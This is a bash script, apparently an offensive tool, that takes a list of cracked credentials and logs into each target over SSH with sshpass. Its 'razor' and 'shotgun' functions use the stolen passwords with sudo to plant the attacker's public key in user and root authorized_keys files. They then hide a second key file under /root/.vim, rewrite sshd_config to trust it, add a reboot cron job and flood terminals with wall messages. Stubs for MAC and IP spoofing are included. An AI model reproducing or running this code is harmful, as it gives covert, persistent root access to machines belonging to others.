#!/bin/bash
#=======================================================================================
#=== DESCIPTION ========================================================================
#=======================================================================================
	## sets up ssh keys and adds new path
	## quickly changes your ip/mac
	##
#=======================================================================================
#=======================================================================================
	#
	#*************** NEED TO DO/ADD ***********************
	# "clone target" function
	# checks for host/target OS and make changes accordingly
	#******************************************************
	#
#///////////////////////////////////////////////////////////////////////////////////////
#|||||||||||||||||||||||| Script Stuff Starts |||||||||||||||||||||||||||||||||||||||||
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
###### RUN function #######
###########################
function main(){		###
	#neo				###
	#meat				###
	infect				###
	#mutate				### "RANDOMIZE"
	#mirror				### IMPERSONATE
	#molt				### ORIGINAL CONFIG
}						###
###########################
#------ error handling ----------
### If error, give up			#
#set -e							#
#- - - - - - - - - - - - - - - -#
### if error, do THING			#
# makes trap global 			#
#set -o errtrace				#
# 'exit' can be a func or cmd	#
#trap 'exit' ERR				#
#--------------------------------
###########################################################################################
# installs keys, changes key path, attempts to take root
###########################################################################################
function infect(){
#### launch bay #########
function payload(){		#
#	razor				# SINGLE TARGET
	shotgunTest				# EVERYONE
}						#
#########################
	#### Setting Defaults ############################
	crackedLogins="./crackedLogins"
	sshKey="/root/.ssh/id_rsa"
	#### Gathering Info ############################
	# making key if there isn't one
		if [ ! -e $sshKey ]; then
			ssh-keygen -f $sshKey -t rsa -N ''
		fi
#+++++++++++++++
# single target
#+++++++++++++++
	function razor(){
		#statements
		#### Inserting keys ############################
		printf "\nInserting ssh key into [$target] with ($username:$password)\n"
		sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target "echo $password | sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat | sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys" </root/.ssh/id_rsa.pub
	}
#+++++++++++++++
# into a crowd
#+++++++++++++++
function shotgunTest(){
	while read -r tango; do
	#### Assigning values ############################
		target="$(echo $tango | cut -d" " -f1)"
		username="$(echo $tango | cut -d" " -f2)"
		password="$(echo $tango | cut -d" " -f3)"

		echo "------------------------------------------------------------------"
		echo "|target= $target"
		echo "|username= $username"
		echo "|password= $password"

		sshLoginCommand="sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target"
	#### Inserting keys ############################
		printf "\nInserting ssh key into [$target] with ($username:$password)\n"
		if $sshLoginCommand 'uname -v | grep -oq Ubuntu'; then
			echo "it's Ubuntu"
		else if uname -v | grep -o Debian; then
			echo "something went wrong. its debian"
			fi
		fi

	done <<< $(sort -u $crackedLogins)
}
	function shotgun(){
		while read -r tango; do
		#### Assigning values ############################
			target="$(echo $tango | cut -d" " -f1)"
			username="$(echo $tango | cut -d" " -f2)"
			password="$(echo $tango | cut -d" " -f3)"

		#### Inserting keys ############################
			printf "\nInserting ssh key into [$target] using: $username:$password\n"
			sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target "
							echo $password |
							sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat |
							sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys
							" </root/.ssh/id_rsa.pub
			#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
				printf "\nPoisoning sshd rules on [$target]\n"
				ssh -n -o StrictHostKeyChecking=no $target "
							mkdir -p /root/.vim
							cp /root/.ssh/authorized_keys /root/.vim/ssh
							sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
							(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
							for n in {1..1000}; do wall -n 'WOULD YOU LIKE TO PLAY A GAME???'; sleep 0.1; done
							" &
		done <<< $(sort -u $crackedLogins)
	}
	payload
}
###########################################################################################
# if called; changes ip, mac, etc
###########################################################################################
function mutate(){
	:
	#### PART 1 ############################
}
###########################################################################################
# tries to make us appear as another
###########################################################################################
function mirror(){
	:
}
###########################################################################################
# returns to original form
###########################################################################################
function molt(){
	:
	#### PART 1 ############################
}
###########################################################################################
# makes sure everything we need is installed
###########################################################################################
function meat(){
	commands="macchanger sshpass net-tools"
	installing=""
	updated=0
	scriptPath="$BASH_SOURCE"

	# updating repo list, if needed
		if [[ $updated == 0 ]]; then
			command apt update
		# so it knows not to check again
			sed -i 's/updated=0/updated=1/' $scriptPath
		fi
	# lookin for missing apps
		for word in $commands; do
			if ! dpkg-query -W -f='${Status}' "$word" | grep -q "ok installed"; then
				installing="${installing} "$word""
			fi
		done
	# installing missing apps
		if [ "$installing" != "" ]; then
			command yes | apt install $installing
			printf "\n\n\tInstalled:\n\t\t[$installing ]\n\n"
		else
			printf "\n--------------------------------------------------------------------\n"
		fi
}
###########################################################################################
# are you root? no? well, try again
###########################################################################################
function neo(){
	if [[ $EUID -ne 0  ]]; then
		printf "\nyou forgot to run as root again... "
		printf "\nCurrent dir is "$(pwd)"\n\n"
		exit 1
	fi
}
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

main
